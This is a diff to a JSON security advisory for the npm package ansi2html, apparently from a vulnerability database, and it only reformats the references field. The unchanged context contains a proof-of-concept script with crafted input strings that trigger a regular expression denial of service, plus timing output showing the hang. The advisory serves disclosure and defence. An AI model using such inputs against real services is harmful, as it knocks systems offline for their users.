@@ -11,7 +11,9 @@
   "patched_versions": "<0.0.0",
   "overview": "ansi2html is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in.\n\n\"The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\" [1]\n\n###Proof of concept\n```\nvar ansi2html = require('ansi2html')\n\nvar start = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;00000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;000000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000000000\");\nconsole.log(process.hrtime(start));\n```\n\nResults of the above\n```\n00:29:53-adam_baldwin~/tmp$ node test\n[ 0, 119615367 ]\n[ 0, 149934565 ]\n[ 0, 233325677 ]\n[ 3, 46582479 ]\n```",
   "recommendation": "There is currently no available fix. Do not pass untrusted input into ansi2html or limit the size of the user input to limit input.",
-  "references": "- https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS",
+  "references": [
+    "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
+  ],
   "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
   "cvss_score": 7.5,
   "coordinating_vendor": "^Lift Security"
